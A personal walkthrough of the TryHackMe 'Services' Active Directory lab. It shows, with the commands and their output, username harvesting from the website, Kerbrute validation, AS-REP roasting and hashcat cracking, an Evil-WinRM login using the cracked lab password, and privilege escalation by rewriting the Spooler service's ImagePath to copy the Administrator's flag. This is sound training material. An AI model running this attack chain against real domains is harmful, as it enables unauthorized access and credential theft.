---
lab: "Services"
date: "2026-09-25"
platform: "TryHackMe"
difficulty: "Medium"
---
# Room link: https://tryhackme.com/room/services

![](../Attachments/Pasted%20image%2020260925134317.png)

```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 17:03:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2026-09-23T16:49:14
|_Not valid after:  2027-03-25T16:49:14
|_ssl-date: 2026-09-24T17:03:30+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-24T17:03:21+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

```

This shows:

- `HTTP`/80
- `DNS`/53
- `RPC`/135
- `SMB`/445
- `LDAP`/3268
- `RDP`/3389
- `WinRM` /5985

##### Added entry to `/etc/hosts`

```bash
10.49.140.105 WIN-SERVICES.services.local services.local services.thm
```

Always remember that we need `valid credentials` if ever the services doesn't allow any `anonymous/null` login sessions.
### RPC

```bash
$ rpcclient -U "" -N services.local -c "getdompwinfo"
result was NT_STATUS_ACCESS_DENIED
```

Null session enumeration is disabled on rpc

### SMB

```bash

$ nxc smb services.local -u '' -p '' --shares
SMB         10.49.140.105   445    WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.140.105   445    WIN-SERVICES     [+] services.local\: 
SMB         10.49.140.105   445    WIN-SERVICES     [-] Error enumerating shares: STATUS_ACCESS_DENIED

$ nxc smb services.local -u 'guest' -p '' --shares
SMB         10.49.140.105   445    WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.140.105   445    WIN-SERVICES     [-] services.local\guest: STATUS_ACCOUNT_DISABLED

```

### LDAP

```bash
$ ldapsearch -x -H ldap://services.thm:389 -b "DC=services,DC=local" "(objectClass=user)"
# extended LDIF
#
# LDAPv3
# base <DC=services,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5E, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

```

`LDAP` is the same. It requires  authentication.

Now at this point, I couldn't find a username.  The good thing is that there is an `HTTP` service on the machine. 

### HTTP

![](../Attachments/Pasted%20image%2020260925140509.png)

Here, they show their team members on `/about.html` endpoint. `Jack Rock` is the obvious the target as he is an `IT STAFF` and the chance that he has access to a computer in the `domain controller` is very high. 

Another problem is the format of their usernames. Fortunately, their `/contact.html` endpoint shows the format of the usernames in the domain. 

![](../Attachments/Pasted%20image%2020260925140712.png)

The format is:

- First letter of the first name
- Followed by a dot `.`
- Lastname
-  `@services.local`

With that , I created a `username` list. I added a decoy to verify that my list is working.


```nmap
$ cat usernames.txt

j.doe
j.rock
w.masters
j.larusso
t.me
```

Next step is to validate usernames. I'm going to use `Kerbrute`.

```bash
$ kerbrute userenum -d services.local --dc services.thm  usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/25/26 - Ronnie Flathers @ropnop

2026/09/25 14:10:02 >  Using KDC(s):
2026/09/25 14:10:02 >   services.thm:88

2026/09/25 14:10:02 >  [+] VALID USERNAME:       w.masters@services.local
2026/09/25 14:10:02 >  [+] VALID USERNAME:       j.larusso@services.local
2026/09/25 14:10:02 >  [+] VALID USERNAME:       j.doe@services.local
2026/09/25 14:10:02 >  [+] VALID USERNAME:       j.rock@services.local
2026/09/25 14:10:02 >  Done! Tested 5 usernames (4 valid) in 0.358 seconds
```

Great! We got 4 valid usernames out of 5.

Next is to identify their passwords. I ran each username and pair them with their usernames as passwords. 

```bash
$ nxc smb services.local -u usernames.txt -p usernames.txt --continue-on-success --no-brute
SMB         10.49.140.105   445    WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.140.105   445    WIN-SERVICES     [-] services.local\j.doe:j.doe STATUS_LOGON_FAILURE 
SMB         10.49.140.105   445    WIN-SERVICES     [-] services.local\j.rock:j.rock STATUS_LOGON_FAILURE 
SMB         10.49.140.105   445    WIN-SERVICES     [-] services.local\w.masters:w.masters STATUS_LOGON_FAILURE 
SMB         10.49.140.105   445    WIN-SERVICES     [-] services.local\j.larusso:j.larusso STATUS_LOGON_FAILURE 

```

Unfortunately, no match on it. 

The next thing that I did is `AS-REP Roasting`. 

This checks for accounts that have `DONT_REQUIRE_PREAUTH` set.  If there is one, we can request `TGT` without valid credentials. We will receive an `AS-REP` response encrypted with that user's password hash. 

```bash
$ GetNPUsers.py services.local/ -usersfile usernames.txt -format hashcat -outputfile AS_REP.hashes -dc-ip services.thm
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'GetNPUsers.py')
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$j.rock@SERVICES.LOCAL:704fc0ed97d6c1e0d9314df4967fe0a4$b0e03baa578ddd8a062c1c282758e47387615d8a2840e1e7b02d207da0ca30765b4846266ad1f7071c2ff87e480d3af54de23c9d6093471c3d7e8ec4b542db95029930c4286a785b5213e44f76cffd8e17716b78b3f5acbd63eeee97345e5938e7570bf3e1fd304554c8855e2cef622f676bb1da6e7d0a11fdc18dc51e57b6e93e165737f2b37ec03569c4c83493fa7c04af1f82a8f3ca4e94e4ce0cded283fc4aabcc8896938be6cb5e35182fbec10a19eccd38405f238052802cb3d45e75275016fe6ec616ffd95e7b321a0f310d93c25f021eb089e405ca31df904f09694b6dea704c806c0cbdb3f924d927679e9b
[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We got one! It's the password hash for `j.rock` which is the `IT STAFF`. This is big. 

Save the hash to a text file and crack it with either `hashcat` or `john`.

```bash
$ hashcat -m 18200 -a 0 AS_REP.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

$krb5asrep$23$j.rock@SERVICES.LOCAL:704fc0ed97d6c1e0d9314df4967fe0a4$b0e03baa578ddd8a062c1c282758e47387615d8a2840e1e7b02d207da0ca30765b4846266ad1f7071c2ff87e480d3af54de23c9d6093471c3d7e8ec4b542db95029930c4286a785b5213e44f76cffd8<SNIP>:{REDACTED} # <- password

```

Now that I was able to crack `j.rock`'s password. I tried to get shell access using `Evil-WinRm`.

### SHELL ACCESS

```bash
$ evil-winrm -i services.local -u j.rock -p Serviceworks1
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\j.rock\Documents>
```

### USER FLAG

```bash
*Evil-WinRM* PS C:\Users\j.rock\Documents> type C:\Users\j.rock\Desktop\user.txt
THM{REDACTED}
```

### Privesc enumeration

```powershell
*Evil-WinRM* PS C:\Users\j.rock\Documents> net user j.rock
User name                    j.rock
Full Name                    Jack Rock
Comment                      IT Support
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/15/2023 5:42:32 AM
Password expires             Never
Password changeable          2/16/2023 5:42:32 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/25/2026 6:17:23 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```

`j.rock` is part of `Remote Management Use` and `Server Operators`.

I ran `bloodhound-python` 

```bash
$ sudo bloodhound-python -d services.local -u j.rock -p 'Serviceworks1' -ns 10.49.185.67 -c All 
```

![](../Attachments/Pasted%20image%2020260925143927.png)

![](../Attachments/Pasted%20image%2020260925144017.png)

Both groups doesn't have any `Outbound Object Control`.  It means I have to enumeration within the shell. I ran `winpeas.exe`

![](../Attachments/Pasted%20image%2020260925144720.png)

This shows that `Server Operators` have `GenericWrite` on most services that is running on the machine. 

I chose a service I'm familiar with. 

`HKLM\system\currentcontrolset\services\Spooler (Server Operators [Allow: WriteKey GenericWrite])`.

Check what it runs as

```powershell
*Evil-WinRM* PS C:\Windows> (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler").ObjectName
LocalSystem
```

This runs as `LocalSystem`. 

Now check `ImagePath` to see what its value.

```powershell
*Evil-WinRM* PS C:\Windows> (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler").ImagePath
C:\Windows\System32\spoolsv.exe
```

We can change it's value to run a command using cmd.exe.

```powershell
*Evil-WinRM* PS C:\Windows> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler" -Name "ImagePath" -Value "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\root.txt"
```

Now the problem is that we don't have a way to restart the service because it is disabled.

```powershell
*Evil-WinRM* PS C:\Windows> Stop-Service -Name "Spooler" -Force
Service 'Print Spooler (Spooler)' cannot be stopped due to the following error: Cannot open Spooler service on computer '.'.
```

The good thing is that `j.rock` has the privilege to shutdown the system. 

```powershell
*Evil-WinRM* PS C:\Windows> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeSystemtimePrivilege         Change the system time              Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Just shutdown the server with a restart flag.

```powershell
*Evil-WinRM* PS C:\Windows> shutdown /r /t 0

                                        
Error: Connection timeout or error occurred: Errno::ECONNREFUSED - Connection refused - Connection refused - connect(2) for "services.local" port 5985 (services.local:5985)
                                        
Warning: Cleaning up and exiting...

```

Wait for couple seconds. 

### ROOT FLAG

After I log back in, go and check if the `root flag` got extracted.

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        2/15/2023   5:39 AM                inetpub
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---        2/17/2023   3:34 AM                Program Files
d-----        3/11/2021   7:29 AM                Program Files (x86)
d-r---        2/15/2023   5:48 AM                Users
d-----        2/15/2023   5:39 AM                Windows
-a----        9/25/2026   7:51 AM             23 root.txt

*Evil-WinRM* PS C:\> type root.txt
THM{REDACTED}
```





